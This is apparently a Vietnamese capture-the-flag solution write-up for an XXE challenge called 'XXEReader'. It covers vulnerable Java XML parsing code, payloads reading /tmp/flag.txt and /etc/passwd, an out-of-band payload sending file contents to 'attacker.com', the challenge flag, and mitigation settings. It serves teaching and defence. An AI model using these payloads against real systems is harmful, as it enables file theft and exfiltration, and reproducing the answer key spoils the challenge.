# Thử thách 15: XXEReader - Giải pháp

## Loại lỗ hổng
**XML External Entity (XXE) Injection (Chèn thực thể bên ngoài XML)**

## Mô tả
Ứng dụng có tính năng nhận và phân tích cú pháp (parse) dữ liệu XML nhưng lại không tắt tính năng xử lý các "thực thể bên ngoài" (External Entities). Điều này cho phép kẻ tấn công truy xuất (read) các tệp hệ thống trên máy chủ hoặc khởi tạo kết nối mạng ngoài ý muốn.

## Mã nguồn chứa lỗ hổng
```java
// VULNERABLE: XXE enabled (no secure factory)
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")));
```

## Khai thác (Exploit)

### Bước 1: Thu thập thông tin mục tiêu
- Flag được cất giấu trong file: `/tmp/flag.txt`
- Ứng dụng sẽ parse cấu trúc XML và bóc tách dữ liệu từ thẻ `<name>` để in ra màn hình.
- Chúng ta sẽ định nghĩa một thực thể bên ngoài (External Entity) để đọc nội dung file cục bộ và chèn vào thẻ `<name>`.

### Bước 2: Tạo Payload XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<products>
  <name>&xxe;</name>
</products>
```

### Bước 3: Đẩy Payload lên Server
1. Truy cập vào ứng dụng web XXEReader.
2. Dán đoạn Payload XML độc hại thay thế cho đoạn XML mặc định.
3. Bấm nút "Parse XML".
4. Nội dung của tệp `/tmp/flag.txt` sẽ hiển thị trọn vẹn tại vị trí của thẻ `<name>`.

## Payload thay thế

### Đọc file `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <name>&xxe;</name>
</products>
```

### Kỹ thuật Out-Of-Band (OOB) XXE bằng Parameter Entities
Dùng trong trường hợp ứng dụng không in kết quả thẻ `<name>` ra màn hình (Blind XXE):
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<products>
  <name>test</name>
</products>
```

## Flag
```
FCTF{xxe_r34ds_y0ur_f1l3s}
```

## Cách hoạt động
- Trình phân tích cú pháp (XML Parser) hỗ trợ tính năng định nghĩa Document Type Definition (DTD).
- DTD cho phép khai báo các Entity (thực thể) trỏ tới các file (file://) hoặc URL bên ngoài (http://).
- Khi Entity (ở đây là `&xxe;`) được gọi trong thân XML, trình parser sẽ xử lý nó bằng cách đi đọc file `/tmp/flag.txt` rồi mang nội dung thế chỗ vào đó.
- Lỗ hổng này xảy ra bởi vì server mặc định tin tưởng và phân giải toàn bộ thực thể XML một cách ngây thơ.

## Biện pháp phòng ngừa (Mitigation)
- Cách tốt nhất là tắt hoàn toàn tính năng nạp Thực thể bên ngoài (External Entities) và DTD trong thư viện parser:
  ```java
  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
  factory.setXIncludeAware(false);
  factory.setExpandEntityReferences(false);
  ```
- Chuyển sang sử dụng JSON thay cho XML nếu có thể (JSON không có các rủi ro phức tạp về Entity).
- Luôn cập nhật thư viện parser lên bản mới nhất (các bản Java mới thường chặn XXE mặc định).
